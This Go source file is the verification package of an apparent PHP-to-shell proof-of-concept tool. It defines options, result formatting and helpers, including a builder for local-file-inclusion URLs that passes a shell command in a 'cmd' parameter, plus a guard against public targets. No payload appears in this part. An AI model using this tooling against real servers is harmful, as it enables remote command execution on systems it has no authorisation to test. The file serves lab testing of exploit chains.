// Package verify contains the lab verification routines for the php2shell
// chains. Every routine refuses public targets unless the caller opts in.
package verify

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/eltonlaice/php2shell-poc/internal/guard"
	"github.com/eltonlaice/php2shell-poc/internal/probe"
)

// Options configures a verification run.
type Options struct {
	Target      string
	AllowPublic bool
	Insecure    bool
	Timeout     time.Duration
	Command     string
	SessionDir  string

	InjectPath  string
	LFIPath     string
	PollutePath string
	UploadPath  string
	TriggerPath string
	OOMath      string

	Stall      bool
	StallWait  time.Duration
	Attempts   int
	Size       int64
	Headers    int
	HeaderSize int
	Strategy   string
}

// DefaultOptions returns lab-friendly defaults.
func DefaultOptions(target string) Options {
	return Options{
		Target:      strings.TrimRight(target, "/"),
		Timeout:     15 * time.Second,
		Command:     "id",
		SessionDir:  "/tmp/sessions",
		InjectPath:  "/index.php",
		LFIPath:     "/vuln.php",
		PollutePath: "/app/upload.php",
		UploadPath:  "/app/upload.php",
		TriggerPath: "/api/endpoint.php",
		OOMath:      "/index.php",
		StallWait:   300 * time.Millisecond,
		Attempts:    3,
		Size:        24 << 20,
		Headers:     12000,
		HeaderSize:  512,
		Strategy:    "headers",
	}
}

// Result is the outcome of one chain verification.
type Result struct {
	Chain    string
	OK       bool
	Summary  string
	Evidence []string
	Notes    []string
}

// String renders a result for the terminal.
func (r Result) String() string {
	status := "FAIL"
	if r.OK {
		status = "OK"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "[%s] chain %s: %s", status, r.Chain, r.Summary)
	for _, e := range r.Evidence {
		fmt.Fprintf(&b, "\n       %s", e)
	}
	for _, n := range r.Notes {
		fmt.Fprintf(&b, "\n       note: %s", n)
	}
	return b.String()
}

func (o Options) client() *probe.Client {
	c := probe.New(o.Timeout)
	c.Insecure = o.Insecure
	return c
}

func (o Options) attempts() int {
	if o.Attempts <= 0 {
		return 1
	}
	return o.Attempts
}

func newSID() string {
	var b [12]byte
	if _, err := rand.Read(b[:]); err != nil {
		return "p2sfallbacksessionid"
	}
	return "p2s" + hex.EncodeToString(b[:])
}

func urlFor(target, path string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", err
	}
	u.Path = strings.TrimRight(u.Path, "/") + path
	return u.String(), nil
}

func lfiURL(target, path, file, cmd string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", err
	}
	u.Path = strings.TrimRight(u.Path, "/") + path
	q := u.Query()
	q.Set("page", file)
	if cmd != "" {
		q.Set("cmd", cmd)
	}
	u.RawQuery = q.Encode()
	return u.String(), nil
}

func between(body []byte, start, end string) (string, bool) {
	s := strings.Index(string(body), start)
	if s < 0 {
		return "", false
	}
	rest := string(body)[s+len(start):]
	e := strings.Index(rest, end)
	if e < 0 {
		return "", false
	}
	return strings.TrimSpace(rest[:e]), true
}

func snippet(body []byte, n int) string {
	s := strings.TrimSpace(string(body))
	s = strings.ReplaceAll(s, "\r", " ")
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > n {
		s = s[:n] + "..."
	}
	return s
}

func checkTarget(o Options) error {
	return guard.Check(o.Target, o.AllowPublic)
}
